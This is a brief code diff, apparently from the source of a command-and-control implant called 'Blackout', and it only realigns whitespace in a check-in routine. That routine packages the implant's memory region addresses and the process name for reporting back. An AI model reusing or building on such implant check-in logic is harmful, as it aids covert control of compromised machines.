@@ -306,9 +306,9 @@ FUNC VOID CommandCheckin(
 
     BK_PACKAGE = PackageCreate( BLACKOUT_CHECKIN );
 
-    PackageAddInt64( BK_PACKAGE, Blackout().Region.Base  );
-    PackageAddInt64( BK_PACKAGE, Blackout().Region.Length  );
-    PackageAddInt64( BK_PACKAGE, Blackout().RxRegion.Base  );
+    PackageAddInt64( BK_PACKAGE, Blackout().Region.Base      );
+    PackageAddInt64( BK_PACKAGE, Blackout().Region.Length    );
+    PackageAddInt64( BK_PACKAGE, Blackout().RxRegion.Base    );
     PackageAddInt32( BK_PACKAGE, Blackout().RxRegion.Length  );
 
     PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessName     );
